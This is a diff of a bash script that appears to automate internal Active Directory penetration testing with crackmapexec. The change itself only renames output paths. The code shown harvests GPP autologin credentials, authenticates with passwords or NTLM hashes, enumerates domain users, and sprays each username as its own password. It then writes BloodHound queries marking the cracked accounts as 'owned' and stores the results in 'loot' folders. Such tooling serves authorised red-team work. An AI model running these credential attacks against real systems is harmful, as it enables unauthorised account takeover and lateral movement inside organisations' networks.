@@ -80,19 +80,19 @@ then
  # GPP autologin
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt
 
-  echo "Username_as_pass" >> /root/output/runtime.txt
+  echo "username_as_pass" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # User txt from DC
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
    awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' > /root/output/list/user.txt
    rm /root/output/list/raw.txt
-   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
-   grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
+   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username/raw_$DOM.txt
+   grep '+' /root/output/loot/intern/ad/iam/username/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username/user_$DOM.txt
  # keep the raw file for screens and debugging
    # BH owned User
    BHDOM2=$(echo $DOM | tr [:lower:] [:upper:])
-   awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt | cut -d : -f 2 | sort -u | tr [:lower:] [:upper:] > /root/output/loot/intern/ad/iam/username_as_pass/owneduser_$BHDOM.txt
-   for i in $(cat /root/output/loot/intern/ad/iam/username_as_pass/owneduser_$BHDOM.txt); do echo "MATCH (n) WHERE n.name = '$i@$BHDOM' SET n.owned=true RETURN n;" >> /root/output/loot/intern/ad/iam/username_as_pass/bh_owned_$BHDOM.txt ; done
+   awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username/user_$DOM.txt | cut -d : -f 2 | sort -u | tr [:lower:] [:upper:] > /root/output/loot/intern/ad/iam/username/owneduser_$BHDOM.txt
+   for i in $(cat /root/output/loot/intern/ad/iam/username/owneduser_$BHDOM.txt); do echo "MATCH (n) WHERE n.name = '$i@$BHDOM' SET n.owned=true RETURN n;" >> /root/output/loot/intern/ad/iam/username/bh_owned_$BHDOM.txt ; done
 
   echo "Pass-Pol" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
@@ -162,19 +162,19 @@ then
  # GPP autologin
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt
 
-  echo "Username_as_pass" >> /root/output/runtime.txt
+  echo "username_as_pass" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # User txt from DC
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM --users > /root/output/list/raw.txt
    awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' > /root/output/list/user.txt
    rm /root/output/list/raw.txt
-   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
-   grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
+   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username/raw_$DOM.txt
+   grep '+' /root/output/loot/intern/ad/iam/username/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username/user_$DOM.txt
  # keep the raw file for screens and debugging
    # BH owned User
    BHDOM2=$(echo $DOM | tr [:lower:] [:upper:])
-   awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt | cut -d : -f 2 | sort -u | tr [:lower:] [:upper:] > /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt
-   for i in $(cat /root/output/loot/intern/ad/iam/username_as_pass/owneduser.txt); do echo "MATCH (n) WHERE n.name = '$i@$BHDOM' SET n.owned=true RETURN n;" >> /root/output/loot/intern/ad/iam/username_as_pass/bh_owned.txt ; done
+   awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username/user_$DOM.txt | cut -d : -f 2 | sort -u | tr [:lower:] [:upper:] > /root/output/loot/intern/ad/iam/username/owneduser.txt
+   for i in $(cat /root/output/loot/intern/ad/iam/username/owneduser.txt); do echo "MATCH (n) WHERE n.name = '$i@$BHDOM' SET n.owned=true RETURN n;" >> /root/output/loot/intern/ad/iam/username/bh_owned.txt ; done
 
   echo "Pass-Pol" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
